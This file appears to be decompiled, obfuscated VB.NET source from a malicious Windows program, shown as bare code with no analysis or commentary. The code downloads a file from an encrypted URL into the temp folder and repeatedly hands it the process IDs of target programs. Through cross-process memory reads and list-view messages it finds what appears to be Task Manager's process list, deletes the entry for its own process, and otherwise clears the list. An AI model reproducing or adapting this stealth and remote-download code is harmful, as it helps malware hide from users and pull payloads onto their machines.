Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace jtAYXTgtXeY
	' Token: 0x02000019 RID: 25
	Friend NotInheritable Class cHLSQulHuVjW
		' Token: 0x0600008D RID: 141 RVA: 0x0000DD1C File Offset: 0x0000BF1C
		Public Shared Function IDmwksVpGFDvcJF() As String
			If IntPtr.Size = 8 Then
				JWIADYxDQdhHy.keGLFzObTnAtzz = cHLSQulHuVjW.qjajHNdKYZwxp(New Uri(JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107400788))))
			Else
				JWIADYxDQdhHy.keGLFzObTnAtzz = cHLSQulHuVjW.qjajHNdKYZwxp(New Uri(JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107400610))))
			End If
			Return JWIADYxDQdhHy.keGLFzObTnAtzz
		End Function

		' Token: 0x0600008E RID: 142 RVA: 0x0000DD80 File Offset: 0x0000BF80
		Public Shared Function qjajHNdKYZwxp(uri_0 As Uri) As String
			Try
				Dim text As String = Path.GetRandomFileName().Replace(cHLSQulHuVjW.getString_0(107399984), cHLSQulHuVjW.getString_0(107388854)).Remove(0, 3) + cHLSQulHuVjW.getString_0(107399947)
				Dim webClient As WebClient = New WebClient()
				webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), text))
				Return Path.Combine(Path.GetTempPath(), text)
			Catch
			End Try
			Return String.Empty
		End Function

		' Token: 0x0600008F RID: 143 RVA: 0x0000DE14 File Offset: 0x0000C014
		Public Shared Function XBfwajXelRFeJOJ(string_0 As String) As Process
			For Each process As Process In Process.GetProcesses()
				If process.ProcessName.Contains(string_0) Then
					Return process
				End If
			Next
			Return Nothing
		End Function

		' Token: 0x06000090 RID: 144 RVA: 0x0000DE50 File Offset: 0x0000C050
		Public Shared Sub wkGvszkKCEqHa(string_0 As String())
			Dim text As String = cHLSQulHuVjW.IDmwksVpGFDvcJF()
			If String.IsNullOrEmpty(text) Then
				Return
			End If
			While True
				For Each text2 As String In string_0
					Dim process As Process = cHLSQulHuVjW.XBfwajXelRFeJOJ(text2)
					If process IsNot Nothing Then
						Dim text3 As String = process.Id.ToString()
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName))
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + cHLSQulHuVjW.getString_0(107399938))
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107399961)))
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107387545)))
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107399904)))
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107399887)))
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107402981)))
						JWIADYxDQdhHy.feQDIdGoVSINQ(text, text3 + cHLSQulHuVjW.getString_0(107386414) + JWIADYxDQdhHy.aPAxwuEVwvWnky(cHLSQulHuVjW.getString_0(107399902)))
					End If
				Next
				Thread.Sleep(200)
			End While
		End Sub

		' Token: 0x06000091 RID: 145
		Private Declare Function OpenProcess Lib "kernel32.dll" (int_0 As Integer, bool_0 As Boolean, uint_0 As UInteger) As IntPtr

		' Token: 0x06000092 RID: 146
		Private Declare Function VirtualAllocEx Lib "kernel32.dll" (intptr_0 As IntPtr, intptr_1 As IntPtr, uint_0 As UInteger, int_0 As Integer, int_1 As Integer) As IntPtr

		' Token: 0x06000093 RID: 147
		Private Declare Function VirtualFreeEx Lib "kernel32.dll" (intptr_0 As IntPtr, intptr_1 As IntPtr, uint_0 As UInteger, int_0 As Integer) As Boolean

		' Token: 0x06000094 RID: 148
		Private Declare Function CloseHandle Lib "kernel32.dll" (qKYhKKeXntC As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x06000095 RID: 149
		Private Declare Function WriteProcessMemory Lib "kernel32.dll" (xPDsaeaOuMBCYb As IntPtr, ORfXFdtCBlp As IntPtr, jxrCzHjNgQjTemm As Byte(), HOdpevzhXW As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef OCNbhgCBft As UIntPtr) As Boolean

		' Token: 0x06000096 RID: 150
		Private Declare Function ReadProcessMemory Lib "kernel32.dll" (nkIbZaSVOEfL As IntPtr, YDpChhnneVSWe As IntPtr, <Out()> rjvqGYmgqfS As Byte(), aCpVhOVoaVGblmHX As Integer, <System.Runtime.InteropServices.OutAttribute()> ByRef MKGlxUbbFFz As UIntPtr) As Boolean

		' Token: 0x06000097 RID: 151
		Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (wiYletbHmcEI As IntPtr, <System.Runtime.InteropServices.OutAttribute()> ByRef WULIDGHMFDcQx As UInteger) As UInteger

		' Token: 0x06000098 RID: 152
		Private Declare Auto Function SendMessage Lib "user32.dll" (intptr_0 As IntPtr, uint_0 As UInteger, intptr_1 As IntPtr, intptr_2 As IntPtr) As IntPtr

		' Token: 0x06000099 RID: 153
		Private Declare Function FindWindow Lib "user32.dll" (string_0 As String, string_1 As String) As IntPtr

		' Token: 0x0600009A RID: 154
		Private Declare Function FindWindowEx Lib "user32.dll" (intptr_0 As IntPtr, intptr_1 As IntPtr, string_0 As String, string_1 As String) As IntPtr

		' Token: 0x0600009B RID: 155 RVA: 0x0000E048 File Offset: 0x0000C248
		Private Shared Function FsLbJfVegb(object_0 As Object) As Byte()
			Dim num As Integer = Marshal.SizeOf(object_0)
			Dim array As Byte() = New Byte(num - 1) {}
			Dim intPtr As IntPtr = Marshal.AllocHGlobal(num)
			Marshal.StructureToPtr(object_0, intPtr, True)
			Marshal.Copy(intPtr, array, 0, num)
			Marshal.FreeHGlobal(intPtr)
			Return array
		End Function

		' Token: 0x0600009C RID: 156 RVA: 0x00002AC7 File Offset: 0x00000CC7
		Private Shared Function alZQZGGQQnwg(uint_0 As UInteger) As IntPtr
			Return cHLSQulHuVjW.OpenProcess(56, False, uint_0)
		End Function

		' Token: 0x0600009D RID: 157 RVA: 0x00002AD2 File Offset: 0x00000CD2
		Private Shared Sub SDUcBHnTQWwV(intptr_0 As IntPtr)
			cHLSQulHuVjW.CloseHandle(intptr_0)
		End Sub

		' Token: 0x0600009E RID: 158 RVA: 0x00002ADB File Offset: 0x00000CDB
		Private Shared Function LlAhWnDMeat(uint_0 As UInteger, intptr_0 As IntPtr) As IntPtr
			Return cHLSQulHuVjW.VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4)
		End Function

		' Token: 0x0600009F RID: 159 RVA: 0x00002AEF File Offset: 0x00000CEF
		Private Shared Sub ybuwrwWSYMIbw(intptr_0 As IntPtr, intptr_1 As IntPtr, uint_0 As UInteger)
			cHLSQulHuVjW.VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768)
		End Sub

		' Token: 0x060000A0 RID: 160 RVA: 0x0000E084 File Offset: 0x0000C284
		Private Shared Function PTgaAPUNFHa() As IntPtr
			Dim intPtr As IntPtr = cHLSQulHuVjW.FindWindow(cHLSQulHuVjW.getString_0(107399853), cHLSQulHuVjW.getString_0(107399860))
			If intPtr = IntPtr.Zero Then
				intPtr = cHLSQulHuVjW.FindWindow(cHLSQulHuVjW.getString_0(107400339), cHLSQulHuVjW.getString_0(107400298))
				intPtr = cHLSQulHuVjW.FindWindowEx(intPtr, IntPtr.Zero, cHLSQulHuVjW.getString_0(107400339), Nothing)
				intPtr = cHLSQulHuVjW.FindWindowEx(intPtr, IntPtr.Zero, cHLSQulHuVjW.getString_0(107400313), cHLSQulHuVjW.getString_0(107400260))
			Else
				intPtr = cHLSQulHuVjW.FindWindowEx(intPtr, IntPtr.Zero, cHLSQulHuVjW.getString_0(107400339), Nothing)
				intPtr = cHLSQulHuVjW.FindWindowEx(intPtr, IntPtr.Zero, cHLSQulHuVjW.getString_0(107400313), cHLSQulHuVjW.getString_0(107400279))
			End If
			Return intPtr
		End Function

		' Token: 0x060000A1 RID: 161 RVA: 0x00002AFF File Offset: 0x00000CFF
		Private Shared Function zTSdnFlVEAqS(intptr_0 As IntPtr) As IntPtr
			Return cHLSQulHuVjW.SendMessage(intptr_0, 4100UI, IntPtr.Zero, IntPtr.Zero)
		End Function

		' Token: 0x060000A2 RID: 162 RVA: 0x00002B16 File Offset: 0x00000D16
		Private Shared Sub QmfxtUyGyYysuv(intptr_0 As IntPtr, intptr_1 As IntPtr)
			cHLSQulHuVjW.SendMessage(intptr_0, 4104UI, intptr_1, IntPtr.Zero)
		End Sub

		' Token: 0x060000A3 RID: 163 RVA: 0x00002B2A File Offset: 0x00000D2A
		Private Shared Sub AKhELKOfKVdQKx(intptr_0 As IntPtr)
			cHLSQulHuVjW.SendMessage(intptr_0, 4124UI, IntPtr.Zero, IntPtr.Zero)
		End Sub

		' Token: 0x060000A4 RID: 164 RVA: 0x0000E178 File Offset: 0x0000C378
		Private Shared Function wtwdneOEvXbhw(intptr_0 As IntPtr, intptr_1 As IntPtr) As String
			Dim array As Byte() = New Byte(49) {}
			Dim emlQzlwnTtbZS As cHLSQulHuVjW.emlQzlwnTtbZS = Nothing
			Dim num As UInteger
			cHLSQulHuVjW.GetWindowThreadProcessId(intptr_0, num)
			Dim intPtr As IntPtr = cHLSQulHuVjW.alZQZGGQQnwg(num)
			Dim intPtr2 As IntPtr = cHLSQulHuVjW.LlAhWnDMeat(CUInt(Marshal.SizeOf(Of cHLSQulHuVjW.emlQzlwnTtbZS)(emlQzlwnTtbZS)), intPtr)
			Dim intPtr3 As IntPtr = cHLSQulHuVjW.LlAhWnDMeat(50UI, intPtr)
			emlQzlwnTtbZS.rxzCPMjWbPzy = intptr_1
			emlQzlwnTtbZS.ntfobBMniGK = CType(0, IntPtr)
			emlQzlwnTtbZS.pbgQVgDkqIeb = 50UI
			emlQzlwnTtbZS.NttGTssbJrsZyoe = intPtr3
			Dim uintPtr As UIntPtr
			cHLSQulHuVjW.WriteProcessMemory(intPtr, intPtr2, cHLSQulHuVjW.FsLbJfVegb(emlQzlwnTtbZS), CUInt(Marshal.SizeOf(Of cHLSQulHuVjW.emlQzlwnTtbZS)(emlQzlwnTtbZS)), uintPtr)
			cHLSQulHuVjW.SendMessage(intptr_0, 4141UI, intptr_1, intPtr2)
			cHLSQulHuVjW.ReadProcessMemory(intPtr, intPtr3, array, 50, uintPtr)
			cHLSQulHuVjW.ybuwrwWSYMIbw(intPtr, intPtr2, CUInt(Marshal.SizeOf(Of cHLSQulHuVjW.emlQzlwnTtbZS)(emlQzlwnTtbZS)))
			cHLSQulHuVjW.ybuwrwWSYMIbw(intPtr, intPtr3, 50UI)
			cHLSQulHuVjW.SDUcBHnTQWwV(intPtr)
			Return Encoding.ASCII.GetString(array)
		End Function

		' Token: 0x060000A5 RID: 165 RVA: 0x0000E250 File Offset: 0x0000C450
		Private Shared Sub UHHImhkLtZGdt(string_0 As String)
			Dim intPtr As IntPtr = cHLSQulHuVjW.PTgaAPUNFHa()
			If intPtr <> IntPtr.Zero Then
				Dim num As Integer = CInt(cHLSQulHuVjW.zTSdnFlVEAqS(intPtr))
				For i As Integer = 0 To num - 1
					Dim text As String = cHLSQulHuVjW.wtwdneOEvXbhw(intPtr, CType(i, IntPtr))
					If text.Contains(string_0) Then
						cHLSQulHuVjW.QmfxtUyGyYysuv(intPtr, CType(i, IntPtr))
					End If
				Next
			End If
		End Sub

		' Token: 0x060000A6 RID: 166 RVA: 0x0000E2AC File Offset: 0x0000C4AC
		Private Shared Sub aAygOWCyKu()
			Dim intPtr As IntPtr = cHLSQulHuVjW.PTgaAPUNFHa()
			If intPtr <> IntPtr.Zero Then
				cHLSQulHuVjW.AKhELKOfKVdQKx(intPtr)
				cHLSQulHuVjW.AKhELKOfKVdQKx(intPtr)
				cHLSQulHuVjW.AKhELKOfKVdQKx(intPtr)
				cHLSQulHuVjW.AKhELKOfKVdQKx(intPtr)
				cHLSQulHuVjW.AKhELKOfKVdQKx(intPtr)
			End If
		End Sub

		' Token: 0x060000A7 RID: 167 RVA: 0x0000E2EC File Offset: 0x0000C4EC
		Public Shared Sub ONoNWNUYsqKbvge()
			Dim thread As Thread = AddressOf cHLSQulHuVjW.MMLvTGUfHrd
			thread.Start()
		End Sub

		' Token: 0x060000A8 RID: 168 RVA: 0x0000E314 File Offset: 0x0000C514
		Private Shared Sub MMLvTGUfHrd()
			While Not cHLSQulHuVjW.vuFkdJhvlfKN
				If cHLSQulHuVjW.gJMAPWYpFRJPYx Then
					cHLSQulHuVjW.UHHImhkLtZGdt(Process.GetCurrentProcess().ProcessName + cHLSQulHuVjW.getString_0(107399947))
					Thread.Sleep(525)
				Else
					cHLSQulHuVjW.aAygOWCyKu()
					Thread.Sleep(1000)
				End If
			End While
			cHLSQulHuVjW.vuFkdJhvlfKN = False
		End Sub

		' Token: 0x060000AA RID: 170 RVA: 0x00002B42 File Offset: 0x00000D42
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(cHLSQulHuVjW))
			cHLSQulHuVjW.vuFkdJhvlfKN = False
			cHLSQulHuVjW.gJMAPWYpFRJPYx = True
		End Sub

		' Token: 0x0400009E RID: 158
		Private Shared vuFkdJhvlfKN As Boolean

		' Token: 0x0400009F RID: 159
		Public Shared gJMAPWYpFRJPYx As Boolean

		' Token: 0x040000A0 RID: 160
		<NonSerialized()>
		Friend Shared getString_0 As GetString

		' Token: 0x0200001A RID: 26
		Private Structure emlQzlwnTtbZS
			' Token: 0x040000A1 RID: 161
			Public NEEVujkTkd As UInteger

			' Token: 0x040000A2 RID: 162
			Public rxzCPMjWbPzy As IntPtr

			' Token: 0x040000A3 RID: 163
			Public ntfobBMniGK As IntPtr

			' Token: 0x040000A4 RID: 164
			Public rXEnnPjLAZJKX As UInteger

			' Token: 0x040000A5 RID: 165
			Public skzHYyRnMfpq As UInteger

			' Token: 0x040000A6 RID: 166
			Public NttGTssbJrsZyoe As IntPtr

			' Token: 0x040000A7 RID: 167
			Public pbgQVgDkqIeb As UInteger

			' Token: 0x040000A8 RID: 168
			Public hxggkZXHDgk As Integer

			' Token: 0x040000A9 RID: 169
			Public GocZHFNgobaM As IntPtr
		End Structure
	End Class
End Namespace
